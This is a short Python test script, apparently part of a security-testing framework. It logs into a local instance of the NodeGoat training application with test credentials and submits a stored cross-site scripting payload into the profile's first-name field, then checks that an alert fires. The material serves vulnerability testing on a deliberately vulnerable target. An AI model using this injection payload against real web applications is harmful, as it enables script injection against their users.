from selenium.webdriver.common.by import By
from data.exploits.framework.BasicExploit import BasicExploit

class Exploit(BasicExploit):

    attributes = {
          "Name" : "Nodegoat_XSS_Client",
          "Description" : "",
          "Target" : "nodegoat",
          "Container" : "ubuntu-node-mongo",
          "Type" : ""
    }

    def runExploit(self):
      wrapper = self.wrapper
      wrapper.navigate("http://localhost:49160/login")
      wrapper.find("userName").keys("goat")
      wrapper.find("password").keys("123")
      wrapper.find("btn-default").click()
      
      wrapper.navigate("http://localhost:49160/profile")
      wrapper.find("firstName").keys("\"> <script>alert(1);</script> <input id='kkk'")
      wrapper.find("btn-default").click()
      alert_text = wrapper.handle_alert()
      self.assertIn("1", alert_text, "Exploit didn't work!")

  